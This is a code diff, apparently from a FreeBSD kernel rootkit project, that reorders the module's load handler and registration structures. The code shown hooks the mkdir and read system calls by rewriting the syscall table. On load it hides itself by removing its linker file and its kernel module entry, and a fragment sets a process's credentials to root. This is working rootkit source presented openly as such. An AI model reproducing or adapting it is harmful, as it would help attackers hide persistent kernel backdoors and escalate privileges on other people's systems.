@@ -18,24 +18,29 @@
 #include "config.h"
 #include "debug.h"
 
-#include <sys/param.h>
-#include <sys/module.h>
-#include <sys/kernel.h>
-#include <sys/systm.h>
-#include <sys/linker.h>
-#include <sys/lock.h>
-#include <sys/mutex.h>
-#include <sys/sx.h>
-#include <sys/types.h> 
-#include <sys/proc.h>
-#include <sys/sysent.h>
-#include <sys/sysproto.h>
-#include <sys/syscall.h>
-#include "detect.h"
+static int
+load(struct module *module, int cmd, void *arg)
+{
+        switch(cmd) {
+        case MOD_LOAD:
+                LOGI("[rootkit:load] Rootkit loaded.\n");
+				toggle_hook(ON, SYS_mkdir, mkdir_hook);
+				toggle_hook(ON, SYS_read, read_hook);	
+				remove_linker_file("rootkit.ko");
+				remove_module_from_kernel("rootkit");
+				break;
+        case MOD_UNLOAD:
+				toggle_hook(OFF, SYS_mkdir, sys_mkdir);
+				toggle_hook(OFF, SYS_read, sys_read);
+                LOGI("[rootkit:load] Rootkit unloaded.\n");
+                break;
+        default:
+                LOGE("[rootkit:load] Unsupported event: {%d}.\n", cmd);
+                break;
+        }
 
-
-void escalate_privledge(struct thread * td);
-void toggle_hook(char * state, int sys_call_num, void*dest_func);
+        return(0);
+}
 
 static int mkdir_hook(struct thread *td, void *syscall_args){
 	struct mkdir_args*uap;
@@ -88,49 +93,6 @@ void toggle_hook(char * state, int sys_call_num, void*dest_func){
 	sysent[sys_call_num].sy_call = (sy_call_t*)dest_func;
 }
 
-
-static int
-load(struct module *module, int cmd, void *arg)
-{
-        switch(cmd) {
-        case MOD_LOAD:
-                LOGI("[rootkit:load] Rootkit loaded.\n");
-				toggle_hook(ON, SYS_mkdir, mkdir_hook);
-				toggle_hook(ON, SYS_read, read_hook);	
-				remove_linker_file("rootkit.ko");
-				remove_module_from_kernel("rootkit");
-				break;
-        case MOD_UNLOAD:
-				toggle_hook(OFF, SYS_mkdir, sys_mkdir);
-				toggle_hook(OFF, SYS_read, sys_read);
-                LOGI("[rootkit:load] Rootkit unloaded.\n");
-                break;
-        default:
-                LOGE("[rootkit:load] Unsupported event: {%d}.\n", cmd);
-                break;
-        }
-
-        return(0);
-}
-
-
-static moduledata_t rootkit_mod = {
-        MODULE_NAME,
-        load,
-        NULL
-};
-
-static moduledata_t mkdir_hook_mod = {
-	"mkdir_hook",
-	load,
-	NULL
-};
-
-static moduledata_t read_hook_mod = {
-	"read_hook",
-	load,
-	NULL
-};
 
 int remove_module_from_kernel(char * name){
 	struct module * mod;
@@ -191,6 +153,25 @@ void escalate_privledge(struct thread * td){
 	td->td_ucred->cr_svgid = 0;
 }
 
+
+
+static moduledata_t rootkit_mod = {
+        MODULE_NAME,
+        load,
+        NULL
+};
+
+static moduledata_t mkdir_hook_mod = {
+	"mkdir_hook",
+	load,
+	NULL
+};
+
+static moduledata_t read_hook_mod = {
+	"read_hook",
+	load,
+	NULL
+};
 
 DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
 DECLARE_MODULE(mkdir_hook, mkdir_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
